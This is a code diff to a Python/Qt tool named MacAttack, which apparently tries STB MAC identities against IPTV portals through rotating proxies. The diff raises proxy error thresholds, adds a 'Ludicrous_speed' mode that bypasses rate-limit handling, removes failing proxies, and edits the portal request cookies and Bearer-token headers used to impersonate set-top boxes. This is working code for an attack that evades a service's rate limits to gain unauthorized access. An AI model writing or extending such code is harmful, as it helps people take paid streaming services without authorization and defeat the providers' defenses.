-                            self.proxy_error_connect_counts[selected_proxy] > 20
+                            self.proxy_error_connect_counts[selected_proxy] > 60
                         ):  # Track error count for the proxy every # consecutive connection errors.
                             self.update_error_text_signal.emit(
-                                f"Error for portal: <b>The target machine refused connection</b> {selected_proxy} Ratelimited?"
+                                f"Error for portal: <b>The target machine refused connection</b> {selected_proxy}"
                             )
                             self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
                             del self.proxy_error_connect_counts[selected_proxy]
 
                 elif "Read timed out" in str(e):
                     logging.debug(f"{selected_proxy} did not respond")
-                    if ratelimit_timeout > 0:       
+                    if not Ludicrous_speed and ratelimit_timeout > 0:       
                         # Track connection error counts
                         if selected_proxy not in self.proxy_error_connect_counts:
                             self.proxy_error_connect_counts[selected_proxy] = 1
                         else:
                             self.proxy_error_connect_counts[selected_proxy] += 1
                         if (
-                            self.proxy_error_connect_counts[selected_proxy] > 20
+                            self.proxy_error_connect_counts[selected_proxy] > 60
                         ):  # Track error count for the proxy every # consecutive connection errors.
+
+                            # Track error count for the proxy
+                            if selected_proxy not in self.proxy_error_counts:
+                                self.proxy_error_counts[selected_proxy] = 1
+                            else:
+                                self.proxy_error_counts[selected_proxy] += 1
                             self.update_error_text_signal.emit(
-                                f"Error for Proxy: <b>Read timed out</b> {selected_proxy} Overloaded proxy?"
+                                f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: <b>Read timed out</b> {selected_proxy}"
                             )
-                            self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
+                            self.remove_proxy(
+                                selected_proxy, self.proxy_error_counts
+                            )  # remove the proxy if it exceeds the allowed error count
+
+                            #self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
                             del self.proxy_error_connect_counts[selected_proxy]
 
                 elif "Unable to connect to proxy" in str(e):
                     logging.debug(f"Unable to connect to {selected_proxy}")
-                    if ratelimit_timeout > 0:       
+                    if not Ludicrous_speed and ratelimit_timeout > 0:       
                         # Could be bad internet, the proxy ratelimiting, or the proxy not connecting
                         # Track connection error counts
                         if selected_proxy not in self.proxy_error_connect_counts:
@@ -4400,12 +4605,22 @@ class MacAttack(QMainWindow):
                         else:
                             self.proxy_error_connect_counts[selected_proxy] += 1
                         if (
-                            self.proxy_error_connect_counts[selected_proxy] > 20
+                            self.proxy_error_connect_counts[selected_proxy] > 60
                         ):  # Track error count for the proxy every # consecutive connection errors.
+
+                            # Track error count for the proxy
+                            if selected_proxy not in self.proxy_error_counts:
+                                self.proxy_error_counts[selected_proxy] = 1
+                            else:
+                                self.proxy_error_counts[selected_proxy] += 1
                             self.update_error_text_signal.emit(
-                                f"Error for Proxy: <b>Proxy Timing out</b> {selected_proxy} Ratelimited?"
+                                f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: <b>Proxy Timing out</b> {selected_proxy}"
                             )
-                            self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
+                            self.remove_proxy(
+                                selected_proxy, self.proxy_error_counts
+                            )  # remove the proxy if it exceeds the allowed error count
+
+                            #self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
                             del self.proxy_error_connect_counts[selected_proxy]
 
                 else:  # Remove errorcounts
@@ -4415,21 +4630,22 @@ class MacAttack(QMainWindow):
                         del self.proxy_error_connect_counts[selected_proxy]
 
     def remove_proxy(self, proxy, proxy_error_counts):
-        """Remove a proxy after exceeding error count and update UI."""
-        error_limit = self.proxy_remove_errorcount.value()
-        if error_limit > 0 and self.proxy_error_counts.get(proxy, 0) >= error_limit:
-            # Remove proxy from the list
-            current_text = self.proxy_textbox.toPlainText()
-            new_text = "\n".join(
-                line for line in current_text.splitlines() if line.strip() != proxy
-            )
-            self.macattack_update_proxy_textbox_signal.emit(new_text)
-            # Remove proxy from dictionary
-            self.proxy_error_counts.pop(proxy, None)
-            # Notify user
-            self.update_error_text_signal.emit(
-                f"Proxy {proxy} removed after exceeding {error_limit} consecutive errors."
-            )
+        if self.proxy_enabled_checkbox.isChecked():
+            """Remove a proxy after exceeding error count and update UI."""
+            error_limit = self.proxy_remove_errorcount.value()
+            if error_limit > 0 and self.proxy_error_counts.get(proxy, 0) >= error_limit:
+                # Remove proxy from the list
+                current_text = self.proxy_textbox.toPlainText()
+                new_text = "\n".join(
+                    line for line in current_text.splitlines() if line.strip() != proxy
+                )
+                self.macattack_update_proxy_textbox_signal.emit(new_text)
+                # Remove proxy from dictionary
+                self.proxy_error_counts.pop(proxy, None)
+                # Notify user
+                self.update_error_text_signal.emit(
+                    f"Proxy {proxy} removed after exceeding {error_limit} consecutive errors."
+                )
 
     def temp_remove_proxy(self, proxy):
         """Temporarily remove a proxy for ratelimit_timeout seconds, then re-it."""
@@ -4497,14 +4713,14 @@ class MacAttack(QMainWindow):
             return filename
         else:
             # Fancy file-naming because why not complicate things?
-            current_time = datetime.now().strftime("%m%d_%H%M%S")
+            current_time = datetime.now().strftime("%m%d%H%M%S")
             sanitized_url = (
                 self.base_url.replace("http://", "")
                 .replace("https://", "")
-                .replace("/", "_")
-                .replace(":", "-")
+                .replace("/", "-")
+                .replace(":", ".")
             )
-            filename = f"{sanitized_url}_{current_time}.txt"
+            filename = f"{sanitized_url}{current_time}.txt"
             return filename
 
     def GiveUp(self):
@@ -4848,7 +5064,7 @@ class MacAttack(QMainWindow):
                 "sn": sn,
                 "stb_lang": "en",
                 "timezone": "America/Los_Angeles",
-                "token": token,  # token to cookies
+                "token": token,
             }
 
             headers = {
@@ -4866,7 +5082,7 @@ class MacAttack(QMainWindow):
                         "Accept-Encoding": "identity",
                         "Accept": "*/*",
                         "Connection": "keep-alive",
-                        "Authorization": f"Bearer {token}",  # token to headers
+                        "Authorization": f"Bearer {token}",
                         "X-Random": f"{token_random}",
                     }
                 )
@@ -5109,7 +5325,7 @@ class MacAttack(QMainWindow):
                         "sn": sn,
                         "stb_lang": "en",
                         "timezone": "America/Los_Angeles",
-                        "token": token,  # token to cookies
+                        "token": token,
                     }
 
                     headers = {
@@ -5185,7 +5401,7 @@ class MacAttack(QMainWindow):
                     "sn": sn,
                     "stb_lang": "en",
                     "timezone": "America/Los_Angeles",
-                    "token": token,  # token to cookies
+                    "token": token,
                 }
 
                 headers = {
